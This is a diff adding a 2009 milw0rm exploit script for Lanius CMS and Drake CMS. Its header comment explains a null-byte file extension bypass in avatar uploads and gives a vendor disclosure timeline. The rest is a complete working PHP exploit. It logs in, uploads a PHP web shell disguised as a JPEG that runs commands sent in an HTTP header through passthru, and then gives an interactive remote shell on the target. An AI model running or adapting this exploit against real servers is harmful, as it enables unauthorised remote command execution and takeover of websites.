@@ -1,0 +1,169 @@
+<?php
+
+/*
+	--------------------------------------------------------
+	Lanius CMS <= 0.5.2 Remote Arbitrary File Upload Exploit
+	--------------------------------------------------------
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	
+	link.....: http://www.laniuscms.org/
+	details..: this vulnerability affects all Drake CMS >= 0.4.6 and Lanius CMS <= 0.5.2 r1050
+ 
+	This PoC was written for educational purpose. Use it at your own risk.
+	Author will be not responsible for any damage.
+
+	[-] vulnerable code in /includes/upload.php (in_upload() function)
+
+	52.		if ($file_sz > $max_sz )
+	53.			return sprintf(_UPLOAD_TOO_BIG, convert_bytes($file_sz), convert_bytes($max_sz));
+	54.			
+	55.		$thy_name = basename(urldecode($_FILES[$elem]['name']));
+	56.		if (isset($allowed_ext)) {
+	57.			$ext = file_ext($thy_name);
+	58.			if (($ext==='') || (!in_array($ext, $allowed_ext)))
+	59.				return sprintf(_UPLOAD_DISALLOWED_EXT, implode(', ',$allowed_ext));
+	60.		}
+	61.		$orig_name = $thy_name;
+
+	[-] file_ext() function defined into /includes/functions.php
+
+	101.	function file_ext($file)
+	102.	{
+	103.		$p = strrpos($file, '.');
+	104.		if ($p===false)return '';
+	105.		return strtolower(substr($file,$p+1));
+	106.	}
+
+	Cause of the uploaded filename is passed to urldecode() function is possibile to inject a null
+	char to bypass the extension's check. This is possibile because strrpos() function, used into
+	file_ext() function, is binary-safe, so by passing a filename e.g. test.php%00.jpg this function
+	returns 'jpg', but the file will be saved as test.php by move_uploadad_file() function.
+
+	[-] Disclosure timeline:
+		
+	[05/04/2009] - Bug discovered
+	[06/04/2009] - Vendor contacted
+	[06/04/2009] - Vendor replied
+	[07/04/2009] - Fix released: http://www.laniuscms.org/?option=content&id=81
+	[07/04/2009] - Public disclosure
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+	if (($s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) == false)
+	  die("\nsocket_create(): " . socket_strerror($s) . "\n");
+
+	if (socket_connect($s, $host, 80) == false)
+	  die("\nsocket_connect(): " . socket_strerror(socket_last_error()) . "\n");
+
+	socket_write($s, $packet, strlen($packet));
+	while ($m = socket_read($s, 2048)) $response .= $m;
+
+	socket_close($s);
+	return $response;
+}
+
+function login()
+{
+	global $host, $path, $username, $password, $sid;
+	
+	print "\n[-] Logging in with username '{$username}' and password '{$password}'\n";
+	
+	$payload = "username={$username}&password={$password}&task=login";
+	$packet  = "POST {$path}?option=login HTTP/1.0\r\n";
+	$packet .= "Host: {$host}\r\n";
+	$packet .= "Content-Length: ".strlen($payload)."\r\n";
+	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	$packet .= "Connection: close\r\n\r\n";
+	$packet .= $payload;
+
+	$response = http_send($host, $packet);
+	preg_match("/PHPSESSID=([0-9a-f]{32})/i", $response, $match);
+	$sid = $match[1];
+	
+	if (!preg_match("/Location: index.php/i", $response))
+		die("[-] Incorrect username/password\n");
+}
+
+function upload()
+{
+	global $host, $path, $sid, $username, $password;
+
+	login();
+	
+	$avatar = "media/forum/avatars/custom/poc.php";
+	$params = array('user_name' => $username,
+					'user_password_orig' => $password,
+					'user_email' => 'foo@bar.com',
+					'btnsubmit' => 'Update',
+					'task' => 'update');
+
+	foreach ($params as $name => $value)
+		$payload .= "--o0oOo0o\r\nContent-Disposition: form-data; name=\"{$name}\"\r\n\r\n{$value}\r\n";
+
+	$payload .= "--o0oOo0o\r\nContent-Disposition: form-data; name=\"user_uploaded_avatar\"; filename=\"poc.php%00.jpg\"\r\n";
+	$payload .= "Content-Type: image/jpeg\r\n\r\n";
+	$payload .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))} ?>\r\n";
+	$payload .= "--o0oOo0o--\r\n";
+	
+	$packet  = "POST {$path}?option=user HTTP/1.0\r\n";
+	$packet .= "Host: {$host}\r\n";
+	$packet .= "Cookie: PHPSESSID={$sid}\r\n";
+	$packet .= "Content-Length: ".strlen($payload)."\r\n";
+	$packet .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
+	$packet .= "Connection: close\r\n\r\n";
+	$packet .= $payload;
+
+	http_send($host, $packet);
+
+	$packet  = "GET {$path}{$avatar} HTTP/1.0\r\n";
+	$packet .= "Host: {$host}\r\n";
+	$packet .= "Connection: close\r\n\r\n";
+
+	if (preg_match('/200 OK/i', http_send($host, $packet)))
+		return $avatar;
+
+	die("[-] Upload failed\n");
+}
+
+print "\n+------------------------------------------------------------------+";
+print "\n| Lanius CMS <= 0.5.2 Remote Arbitrary File Upload Exploit by EgiX |";
+print "\n+------------------------------------------------------------------+\n";
+
+if ($argc < 5)
+{
+	print "\nUsage......: php $argv[0] <host> <path> <username> <password>\n";
+	print "\nExample....: php $argv[0] localhost / user pass";
+	print "\nExample....: php $argv[0] localhost /lanius/ user pass\n\n";
+	die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+$username = $argv[3];
+$password = $argv[4];
+
+$path .= upload();
+
+$packet  = "GET {$path} HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+while(1)
+{
+	print "\nlanius-shell# ";
+	if (($cmd = trim(fgets(STDIN))) == "exit") break;
+	$response = http_send($host, sprintf($packet, base64_encode($cmd)));
+	preg_match("/_code_/", $response) ? print array_pop(explode("_code_", $response)) : die("\n[-] Exploit failed\n");
+}
+
+?>
+
+# milw0rm.com [2009-04-07]
